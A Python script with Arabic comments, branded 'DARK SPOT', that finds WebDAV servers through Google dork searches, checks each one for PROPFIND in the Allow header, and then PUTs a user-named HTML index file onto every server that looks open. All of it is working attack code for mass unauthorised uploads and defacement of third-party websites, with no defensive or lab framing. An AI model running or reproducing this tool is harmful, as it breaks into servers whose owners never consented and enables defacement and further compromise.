import requests
from bs4 import BeautifulSoup
from pyfiglet import Figlet
from tabulate import tabulate
from colorama import Fore, Style, init

# تهيئة colorama
init(autoreset=True)

# الإعدادات
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # يمكنك إضافة المزيد من User Agents هنا
]

HEADERS = {
    "User-Agent": USER_AGENTS[0]
}

# طباعة العنوان باستخدام pyfiglet
def print_banner():
    f = Figlet(font='slant')
    print(Fore.CYAN + f.renderText('DARK SPOT'))

# البحث عن مواقع بها ثغرة WebDav
def search_webdav_vulnerable_sites(dorks):
    sites = []
    for dork in dorks:
        search_url = f"https://www.google.com/search?q={dork}"
        try:
            response = requests.get(search_url, headers=HEADERS)
            soup = BeautifulSoup(response.text, 'html.parser')

            for a in soup.find_all('a', href=True):
                href = a['href']
                if "http" in href:
                    sites.append(href.split('&')[0])
        except requests.RequestException as e:
            print(Fore.RED + f"Error during search: {e}")
    
    return list(set(sites))  # إزالة التكرارات

# فحص إذا كان الموقع به ثغرة WebDav
def check_webdav_vulnerability(url):
    try:
        response = requests.options(url, headers=HEADERS)
        if 'Allow' in response.headers and 'PROPFIND' in response.headers['Allow']:
            return True
        return False
    except requests.RequestException:
        return False

# رفع ملف إلى موقع به ثغرة WebDav
def upload_index_file(url, index_name):
    try:
        files = {'file': (index_name, '<html><body><h1>WebDav Index</h1></body></html>')}
        response = requests.put(f"{url}/{index_name}", data=files['file'][1], headers=HEADERS)
        if response.status_code == 201 or response.status_code == 200:
            return True
        return False
    except requests.RequestException:
        return False

# تنفيذ الأداة
def main():
    print_banner()
    dorks = [
        "intitle:index.of WebDav",
        "inurl:admin WebDav",
        "intitle:index.of + 'webdav'",
        "intitle:index.of + 'webdav' + 'parent directory'",
        "inurl:admin + 'webdav'"
    ]

    index_name = input(Fore.YELLOW + "Enter the name of the index file to upload (e.g., index.html): ").strip()
    search_query = search_webdav_vulnerable_sites(dorks)
    results = []

    for site in search_query:
        if check_webdav_vulnerability(site):
            if upload_index_file(site, index_name):
                results.append([Fore.GREEN + site, Fore.GREEN + "File Uploaded"])
            else:
                results.append([Fore.YELLOW + site, Fore.RED + "Failed to Upload"])
        else:
            results.append([Fore.RED + site, Fore.RED + "Not Vulnerable"])

    print(tabulate(results, headers=[Fore.BLUE + "Site", Fore.BLUE + "Status"], tablefmt="grid"))

if __name__ == "__main__":
    main()
